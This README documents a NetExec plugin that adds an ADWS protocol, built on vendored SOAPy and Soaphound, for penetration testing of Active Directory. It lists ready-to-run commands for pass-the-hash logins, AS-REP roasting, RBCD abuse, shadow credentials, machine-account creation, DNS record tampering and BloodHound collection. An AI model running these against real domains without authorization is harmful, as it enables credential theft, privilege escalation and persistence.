# nxc adws — ADWS protocol for NetExec

Adds a first-class **`adws`** protocol to NetExec that exposes all the
offensive and reconnaissance features of
[SOAPy](https://github.com/jlevere/SOAPy) over port 9389
(Active Directory Web Services / NetTcpBinding).

## Quick start

```bash
# Basic recon
nxc adws dc01.corp.lab -d corp.lab -u alice -p 'Password1!' --users
nxc adws dc01.corp.lab -d corp.lab -u alice -p 'Password1!' --admins
nxc adws dc01.corp.lab -d corp.lab -u alice -p 'Password1!' --asreproastable

# Kerberos authentication via ccache
export KRB5CCNAME=/tmp/alice.ccache
nxc adws dc01.corp.lab -d corp.lab -u alice -k --users

# NT hash authentication
nxc adws dc01.corp.lab -d corp.lab -u alice -H aabbccddeeff... --computers

# Free-form LDAP query
nxc adws dc01.corp.lab -d corp.lab -u alice -p 'pwd' \
    -q '(samaccountname=krbtgt)' -f 'samaccountname,objectsid,memberof' --parse

# Write operations: RBCD, SPN, AS-REP roastable
nxc adws dc01 -u alice -p 'pwd' --rbcd ATTACKER\$ --account victim\$
nxc adws dc01 -u alice -p 'pwd' --spn 'host/foo.bar' --account svc_account
nxc adws dc01 -u alice -p 'pwd' --asrep --account svc_account

# Machine account create / delete / disable
nxc adws dc01 -u alice -p 'pwd' --add-computer FAKE01 --computer-pass 'P@ss123'
nxc adws dc01 -u alice -p 'pwd' --delete-computer FAKE01
nxc adws dc01 -u alice -p 'pwd' --disable-account FAKE01

# Shadow Credentials (msDS-KeyCredentialLink) — requires the dsinternals module
nxc adws dc01 -u alice -p 'pwd' --shadow-creds list   --shadow-target victim
nxc adws dc01 -u alice -p 'pwd' --shadow-creds add    --shadow-target victim
nxc adws dc01 -u alice -p 'pwd' --shadow-creds remove --shadow-target victim --device-id <uuid>
nxc adws dc01 -u alice -p 'pwd' --shadow-creds clear  --shadow-target victim

# AD-integrated DNS management
nxc adws dc01 -u alice -p 'pwd' --dns-add foo.corp.lab --dns-ip 10.0.0.99
nxc adws dc01 -u alice -p 'pwd' --dns-modify foo.corp.lab --dns-ip 10.0.0.42
nxc adws dc01 -u alice -p 'pwd' --dns-remove foo.corp.lab --dns-ip 10.0.0.42
nxc adws dc01 -u alice -p 'pwd' --dns-tombstone foo.corp.lab
nxc adws dc01 -u alice -p 'pwd' --dns-resurrect foo.corp.lab
```

## Installation

This archive mirrors the NetExec layout: just **merge the contents of `nxc/`
into your NetExec installation**.

### Option 1 — install from source (recommended for development)

```bash
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec

# Extract this archive at the repo root
tar xzf nxc-adws.tar.gz --strip-components=0

# Install
poetry install
poetry run nxc adws --help     # confirm the protocol is loaded
```

### Option 2 — install on top of an existing pipx install

```bash
# Locate the pipx venv path
NXC_SITE=$(pipx environment --value PIPX_LOCAL_VENVS)/netexec/lib/python*/site-packages

# Copy the protocol files
cp nxc/protocols/adws.py "$NXC_SITE/nxc/protocols/"
cp -r nxc/protocols/adws "$NXC_SITE/nxc/protocols/"

# Copy the BloodHound module (Soaphound)
cp nxc/modules/soaphound.py "$NXC_SITE/nxc/modules/"
cp -r nxc/modules/_soaphound "$NXC_SITE/nxc/modules/"

# Verify
nxc adws --help
nxc adws --options -M soaphound  # list the module options
```

### Option 3 — patch a local clone

```bash
# From the root of your NetExec clone:
cp -v adws-files/nxc/protocols/adws.py nxc/protocols/adws.py
cp -rv adws-files/nxc/protocols/adws nxc/protocols/adws
```

## Technical details

### Files added

```
nxc/
├── protocols/
│   ├── adws.py                     # adws(connection) class
│   └── adws/
│       ├── __init__.py             # empty
│       ├── proto_args.py           # 48 CLI flags
│       ├── database.py             # SQLAlchemy schema
│       ├── db_navigator.py         # interactive nxcdb navigation
│       └── _soapy/                 # Vendored SOAPy (jlevere/SOAPy, MIT)
│           ├── __init__.py
│           ├── adws.py             # ADWSConnect, NTLMAuth, KerberosAuth
│           ├── ms_nmf.py           # [MC-NMF] .NET Message Framing
│           ├── ms_nns.py           # [MS-NNS] .NET NegotiateStream + Kerberos AP-REQ
│           ├── soa.py              # RBCD/SPN/ASREP/computer operations
│           ├── ad_dns_manager_adws.py  # DNS operations
│           ├── shadow_credentials.py   # msDS-KeyCredentialLink
│           ├── soap_templates.py
│           └── encoder/                # NBFX encoder
└── modules/
    ├── soaphound.py                # BloodHound module (-M soaphound)
    └── _soaphound/                 # Vendored Soaphound
        ├── soaphound.py
        ├── ad/                     # collectors, ACLs, cache, transport
        └── lib/                    # SMB Kerberos auth, domain helpers
```

### Authentication

| Mode             | Flag                                | Notes                                              |
|------------------|-------------------------------------|----------------------------------------------------|
| Password         | `-u USER -p PASS`                   | Standard NTLM SPNEGO                               |
| NT hash          | `-u USER -H NTHASH` or `-H LM:NT`   | Pass-the-hash via NTLM                             |
| Kerberos ccache  | `-u USER -k`                        | Reads `KRB5CCNAME`, accepts a TGT or LDAP TGS      |
| Kerberos kcache  | `-u USER --use-kcache`              | Same (compatibility with other nxc protocols)      |

If the user omits `-d` in Kerberos mode, the domain is extracted from the
ccache (parsed automatically).

### impacket compatibility

SOAPy uses `GSSAPI_AES.GSS_Wrap_LDAP`, which is only available in impacket
**0.13** and later. For older versions (Parrot OS, Kali stable, etc.), a
faithful RFC 4121 §4.2.6.2 fallback is bundled in `_soapy/ms_nns.py`
(functions `_gss_wrap_ldap_aes_compat` and `_gss_unwrap_ldap_aes_compat`).
Validation: **byte-exact** output identical to the native API under a
deterministic confounder (`os.urandom` patched).

### Database

SQLAlchemy schema aligned with WinRM/SSH: `hosts`, `users`,
`admin_relations`, `loggedin_relations`. The new `adws.db` database is
created automatically at `~/.nxc/workspaces/<workspace>/adws.db` on the
first `nxc adws` invocation.

## Known limitations

- **`add-user-bh`** is only called when the global BloodHound collection is
  active in the NetExec session. This does not affect the protocol itself,
  it is just a signal to BloodHound.
- **TLS / signing**: SOAPy authenticates via SPNEGO in cleartext over the
  encrypted NNS wrapping. There is no TLS support for ADWS (not exposed by
  default on the server side).
- **`-M` modules**: this protocol supports the standard NetExec `-M`
  mechanism. The **`soaphound`** module is shipped for BloodHound collection
  (see dedicated section below).
- **`--add-computer`** without a name: generates a random `DESKTOP-XXXXXXXX`.

## BloodHound module: `-M soaphound`

Once the `adws` protocol is authenticated, the full BloodHound collection
can be triggered via Soaphound (vendored under `nxc/modules/_soaphound/`,
Kerberos patch already applied):

```bash
# Full collection (ADWS + SMB sessions)
nxc adws dc01 -d corp.lab -u alice -p Pwd -M soaphound

# Fast collection, no SMB sessions (recommended in Kerberos mode with LDAP TGS)
nxc adws dc01 -d corp.lab -u alice -k -M soaphound -o COLLECTION=ADWSOnly

# Custom output + ready-to-upload BloodHound zip
nxc adws dc01 -d corp.lab -u alice -p Pwd -M soaphound \
    -o OUTPUT_DIR=/tmp/bh ZIP=true

# Also include the AD CS collection (certipy-find)
nxc adws dc01 -d corp.lab -u alice -p Pwd -M soaphound -o CERT_FIND=true
```

Module options:

| Option       | Values                 | Default                     | Description                                  |
|--------------|------------------------|-----------------------------|----------------------------------------------|
| `COLLECTION` | `Default`, `ADWSOnly`  | `Default`                   | `ADWSOnly` disables SMB/RPC sessions         |
| `OUTPUT_DIR` | path                   | `./bloodhound-<host>`       | Directory for the `.json` files              |
| `ZIP`        | `true`/`false`         | `false`                     | Generate a BloodHound-ready upload zip       |
| `CERT_FIND`  | `true`/`false`         | `false`                     | Also run the AD CS collection                |

The module produces `<timestamp>_users.json`, `<timestamp>_groups.json`,
`<timestamp>_computers.json`, `<timestamp>_ous.json`, `<timestamp>_gpos.json`,
`<timestamp>_containers.json`, `<timestamp>_domains.json` — directly
ingestible by BloodHound CE and BloodHound Legacy.

## Equivalent commands

| Original SOAPy                                                   | nxc adws equivalent                                              |
|------------------------------------------------------------------|------------------------------------------------------------------|
| `SOAPy 'corp/alice:Pwd'@dc01 --admins`                           | `nxc adws dc01 -d corp -u alice -p Pwd --admins`                 |
| `SOAPy 'corp/alice'@dc01 -k --users`                             | `nxc adws dc01 -d corp -u alice -k --users`                      |
| `SOAPy 'corp/alice:Pwd'@dc01 --rbcd attacker\$ --account victim` | `nxc adws dc01 -d corp -u alice -p Pwd --rbcd attacker\$ --account victim` |
| `SOAPy 'corp/alice:Pwd'@dc01 --addcomputer FAKE01`               | `nxc adws dc01 -d corp -u alice -p Pwd --add-computer FAKE01`    |

## Credits

- [SOAPy](https://github.com/jlevere/SOAPy) by @jlevere and @_logangoins (MIT)
- [NetExec](https://github.com/Pennyw0rth/NetExec) by the NetExec community
- Kerberos fix (impacket < 0.13 compat): adapted locally
